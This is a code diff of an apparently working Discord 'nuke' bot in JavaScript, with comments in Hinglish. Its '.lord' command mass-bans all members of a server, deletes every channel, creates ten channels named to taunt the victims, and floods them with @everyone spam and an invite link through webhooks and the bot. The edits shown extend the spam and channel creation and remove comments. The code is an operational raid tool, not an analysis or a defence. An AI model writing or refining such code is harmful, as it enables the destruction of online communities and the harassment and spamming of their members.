@@ -13,7 +13,7 @@ if (!TOKEN) {
 
 const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 
-// ============ HTTP SERVER (Render ke liye) ============
+// ============ HTTP SERVER ============
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
   res.writeHead(200, { 'Content-Type': 'text/plain' });
@@ -80,9 +80,7 @@ async function fetchAllMemberIds(guildId) {
   return Array.from(ids);
 }
 
-// ==========================================================
-//   🎯 GUARANTEED BAN — 400/400, failed: 0
-// ==========================================================
+// ============ GUARANTEED BAN ============
 async function banAllMembers(guildId, excludedIds, statusCallback) {
   console.log('📥 Fetching member IDs...');
   const fetchStart = Date.now();
@@ -93,7 +91,6 @@ async function banAllMembers(guildId, excludedIds, statusCallback) {
   console.log(`🎯 Ban targets: ${targets.length}`);
   console.log(`⏱ Fetch time: ${fetchTime}s`);
 
-  // ⚡ Auto-tune
   let CONCURRENCY, BAN_DELAY;
   if (targets.length <= 500) {
     CONCURRENCY = 100; BAN_DELAY = 20;
@@ -225,7 +222,7 @@ async function deleteAllChannels(guildId) {
   return { deleted, failed };
 }
 
-// ============ CREATE CHANNELS ============
+// ============ CREATE 10 CHANNELS ============
 async function createChannels(guildId, name, count) {
   let created = 0, failed = 0;
   const newChannels = [];
@@ -241,7 +238,7 @@ async function createChannels(guildId, name, count) {
       newChannels.push(ch);
       created++;
       console.log(`[CREATE] ✅ ${ch.name} (${ch.id})`);
-      await sleep(1000); // Discord ko register karne ka time do
+      await sleep(1200); // 10 channels ke liye thoda zyada delay
     } catch (e) {
       failed++;
       console.log(`[CREATE] ❌ ${e.message}`);
@@ -251,11 +248,13 @@ async function createChannels(guildId, name, count) {
   return { created, failed, channels: newChannels };
 }
 
-// ============ SPAM — Webhook + Bot dono se ============
+// ============ SPAM — Webhook + Bot dono se (HAR channel me) ============
 async function spamChannelsBoth(channels, text, client) {
   let webhookSpam = 0;
   let botSpam = 0;
   let failed = 0;
+
+  console.log(`[SPAM] Starting spam on ${channels.length} channels...`);
 
   for (const ch of channels) {
     console.log(`[SPAM] Channel: ${ch.id}`);
@@ -289,7 +288,6 @@ async function spamChannelsBoth(channels, text, client) {
         }
       }
 
-      // Cleanup webhooks
       for (const wh of hooks) {
         try { await api('DELETE', `/webhooks/${wh.id}/${wh.token}`, { auth: false }); } catch {}
       }
@@ -333,15 +331,13 @@ async function getTopRoleMember(guildId) {
 }
 
 // ==========================================================
-//   💀 .lord NUKE — FIXED (crash-proof, full 5 steps)
+//   💀 .lord NUKE — 10 CHANNELS + FULL SPAM
 // ==========================================================
 async function handleLord(message) {
   const guildId = message.guild.id;
   let fallbackChannelId = message.channel.id;
 
-  // Safe reply — channel delete ho jaye toh bhi crash na ho
   const reply = async (txt) => {
-    // 1) Original channel try karo
     try {
       const ch = await message.client.channels.fetch(fallbackChannelId).catch(() => null);
       if (ch && ch.isTextBased()) {
@@ -350,7 +346,6 @@ async function handleLord(message) {
       }
     } catch {}
 
-    // 2) Fallback: koi bhi available text channel
     try {
       const guild = await message.client.guilds.fetch(guildId).catch(() => null);
       if (guild) {
@@ -363,14 +358,13 @@ async function handleLord(message) {
         if (anyCh) {
           const sent = await anyCh.send(txt).catch(() => null);
           if (sent) {
-            fallbackChannelId = anyCh.id; // update fallback
+            fallbackChannelId = anyCh.id;
             return;
           }
         }
       }
     } catch {}
 
-    // 3) Last resort: console
     console.log('[REPLY]', txt);
   };
 
@@ -409,19 +403,18 @@ async function handleLord(message) {
     console.error('DELETE ERROR:', err);
   }
 
-  // ===== STEP 3: CREATE 1 CHANNEL =====
-  console.log('[CREATE] Creating 1 channel...');
+  // ===== STEP 3: CREATE 10 CHANNELS =====
+  console.log('[CREATE] Creating 10 channels...');
   let createResult = { created: 0, failed: 0, channels: [] };
   try {
-    createResult = await createChannels(guildId, 'lord-arsh-se-nahi-bajna-chahiye-tha', 1);
+    createResult = await createChannels(guildId, 'lord-arsh-se-nahi-bajna-chahiye-tha', 10);
   } catch (err) {
     console.error('CREATE ERROR:', err);
   }
 
-  // Naye channel me STEP 3 confirmation bhejo
   if (createResult.channels.length > 0) {
     fallbackChannelId = createResult.channels[0].id;
-    await reply(`✅ **STEP 3 DONE:** Created ${createResult.created} channel`);
+    await reply(`✅ **STEP 3 DONE:** Created ${createResult.created} channels`);
   } else {
     await reply(`❌ **STEP 3 FAILED:** Channel create nahi hua`);
   }
@@ -442,8 +435,8 @@ async function handleLord(message) {
     await reply(`❌ STEP 4 FAILED: ${err.message}`);
   }
 
-  // ===== STEP 5: SPAM (Webhook + Bot dono) =====
-  await reply('🔥 **STEP 5:** Spamming (webhook + bot)...');
+  // ===== STEP 5: SPAM (Webhook + Bot dono se, HAR channel me) =====
+  await reply(`🔥 **STEP 5:** Spamming ${createResult.channels.length} channels...`);
   let spamResult = { webhook: 0, bot: 0, failed: 0 };
   try {
     const spamMsg = `# @everyone LORD ARSH AYA HH SWAAGAT TO KARO HAMARA LORD OWNZ YOU 👿 JOIN: https://discord.gg/5SA2R2XcrQ`;
@@ -456,7 +449,7 @@ async function handleLord(message) {
   await reply(`🏆 **LORD COMPLETE** 🏆
 💀 Banned: **${banResult.ok}** / ${banResult.total}
 🗑️ Deleted: ${delResult.deleted}
-📁 Created: ${createResult.created}
+📁 Created: ${createResult.created} channels
 🔥 Webhook Spam: ${spamResult.webhook}
 🤖 Bot Spam: ${spamResult.bot}
 ⏱ Time: ${banResult.secs}s`);
@@ -476,7 +469,6 @@ const client = new Client({
 client.on('error', (err) => console.error('❌ Client error:', err.message));
 client.on('warn', (info) => console.warn('⚠️ Warn:', info));
 
-// ================= MESSAGE LISTENER =================
 client.on('messageCreate', async (message) => {
   try {
     if (message.author?.bot) return;
@@ -484,7 +476,6 @@ client.on('messageCreate', async (message) => {
     if (!content) return;
     const lower = content.toLowerCase();
 
-    // 🔒 SIRF OWNER_ID
     if (message.author.id !== OWNER_ID) return;
 
     if (lower === '.check') {
